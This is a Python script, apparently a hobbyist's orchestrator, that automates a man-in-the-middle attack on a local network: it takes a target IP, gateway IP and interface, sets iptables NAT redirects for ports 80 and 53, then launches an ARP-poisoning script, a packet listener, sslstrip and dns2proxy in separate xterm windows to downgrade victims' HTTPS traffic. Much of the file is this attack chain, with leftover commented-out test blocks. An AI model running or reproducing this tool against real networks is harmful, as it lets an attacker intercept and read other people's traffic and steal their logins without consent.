import subprocess
import optparse
import os
import signal
import time



"""
def preparing_system_settings():
    subprocess.call(
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT",
         "--to-port", "10000"])
    subprocess.call(
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "udp", "--destination-port", "53", "-j", "REDIRECT",
         "--to-port", "53"])

def runing_MITMAttack(target_ip,gateway_ip):
    subprocess.call(["cd","MITM"])
    subprocess.call(["python","MITMAttack","--target",target_ip,"--gateway",gateway_ip])

def runing_MITMListener(interface):
    subprocess.call(["cd","MITMListener"])
    subprocess.call(["python","MITM2","--interface",interface])
    
"""

subprocesses_terminal = {}
def get_user_data():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="please insert your target ip")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="please insert your gateway ip")
    parse_object.add_option("-i","--interface",dest="interface",help="please insert your interface name")
    return parse_object.parse_args()

def start_process(command, process_name):
    command = f"sudo -S xterm -hold -e /bin/bash -c \"{command}\""
    process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    subprocesses_terminal[process_name] = process


def start_process_3(command, process_name, width, height, x_a, x_b):
    command = f"sudo -S xterm -hold -geometry {width}x{height}+{x_a}+{x_b} -e /bin/bash -c \"{command}\""
    #abc=" ; read -n 1 -s -p 'Press any key to exit'"
    #command = f"sudo -S xterm -hold -geometry {width}x{height}+{x_a}+{x_b} -e /bin/bash -c \"{command}\" {abc}"
    process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    subprocesses_terminal[process_name] = process

def start_process_2(command,width,height,x_a,y_b):
    subprocess.call(
        ["gnome-terminal", "--tab", f"--geometry={width}x{height}+{x_a}+{y_b}", "--", "bash", "-c",
         command + " ; read -n 1 -s -p 'Press any key to exit'"])

def start_named_terminal(command, width, height, x_a, x_b, window_name):
    subprocess.Popen(["gnome-terminal", "--geometry", f"{width}x{height}+{x_a}+{x_b}", "--", "--", "bash", "-c", command, f'--title="{window_name}"'])
    time.sleep(3)
    subprocess.call(["wmctrl", "-c", window_name])

def stop_process(process_name):
    if process_name in subprocesses_terminal:
        process = subprocesses_terminal[process_name]
        process.send_signal(signal.CTRL_C_EVENT)
        process.wait()
        subprocesses_terminal.pop(process_name)
    else:
        print(f"{process_name} of process is not found !")


'''
def terminal_output(process_name):
    if process_name in subprocesses_terminal:
        start_process("")
        process= subprocesses_terminal[process_name]
        stdout,stderr= process.communicate()
        xterm - hold - e "cd .. && cd MITMListener && python MITM2.py --interface wlan0"
'''

(user_data)=get_user_data()[0]

command9 = "python /home/leatherfire/PycharmProjects/BasicProject/Basic.py"
command8 = "cd .. && cd BasicProject && python Basic.py"
command7 = "cd .. && cd BasicProject && python Basic.py"


command1="iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
command2="iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53"
command3=f"cd .. && cd MITM && python MITMAttack.py --target {user_data.target_ip} --gateway {user_data.gateway_ip}"
command4=f"cd .. && cd MITMListener && python MITM2.py --interface {user_data.interface}"
command5="cd /opt/dns2proxy && python dns2proxy"
command6="sslstrip"

'''

start_process(command1, "porting80to10000")
print("Port 80 forwarding to 10000")
time.sleep(3)

start_process(command2, "porting53to53")
print("Port 53 forwarding to 53")
time.sleep(3)

start_process(command3,"MITM1")
print("It penetrates between the gateway and the target.")
time.sleep(2)

start_process(command4,"MITM2")
print("Listening packets in between the gateway and the target.")
time.sleep(2)

start_process(command6,"sslstrip")
print("HTTPS to HTTP(Process-SSLSTRİP)")
time.sleep(2)

start_process(command5,"dns2proxy")
print("HTTPS to HTTP(Process-DNS2PROXY)")
time.sleep(2)
'''
""""
start_process(command7,"basicproject")
print("Basic Project is Started")
time.sleep(20)

stop_process("basicproject")
print("Basic Project is Stopped")
time.sleep(5)

"""

#start_process_2(command8)
#start_process_2(command6)

#subprocess.call(["gnome-terminal", "--tab", "--geometry=80x24+0+0", "--", "bash", "-c", command8 + " ; read -n 1 -s -p 'Press any key to exit'"])
#subprocess.call(["gnome-terminal", "--tab", "--geometry=80x24+1300+0", "--", "bash", "-c", command6 + " ; read -n 1 -s -p 'Press any key to exit'"])
#subprocess.call(["gnome-terminal", "--tab", "--geometry=80x24+0+1000", "--", "bash", "-c", command8 + " ; read -n 1 -s -p 'Press any key to exit'"])
#start_process_2(command8,80,25,0,0)
#start_process_2(command8,80,25,1300,0)
#start_process_2(command8,80,25,0,1000)
#start_process_2(command8,80,25,1300,1000)


start_process_3(command1,"1",80,25,0,0)
print("Port 80 forwarding to 10000")
time.sleep(5)

start_process_3(command2,"2",80,25,1500,0)
print("Port 53 forwarding to 53")
time.sleep(5)

start_process_3(command3,"3",80,25,0,1000)
print("It penetrates between the gateway and the target.")
time.sleep(2)

start_process_3(command4,"4",80,25,1500,1000)
print("Listening packets in between the gateway and the target.")
time.sleep(2)

start_process_3(command6,"4",80,25,0,0)
print("HTTPS to HTTP(Process-SSLSTRİP)")
time.sleep(2)

start_process_3(command5,"5",80,25,1500,0)
print("HTTPS to HTTP(Process-DNS2PROXY)")
time.sleep(2)


#start_named_terminal(command8, 80, 24, 0, 0,"Basic Python Project")

'''
#start_process(command8,"basic")
#start_process(command8,"basic2")

start_process_3(command8,"basic1",80,25,0,0)
start_process_3(command8,"basic2",80,25,1500,0)
start_process_3(command8,"basic3",80,25,0,1000)
start_process_3(command8,"basic4",80,25,1500,1000)

'''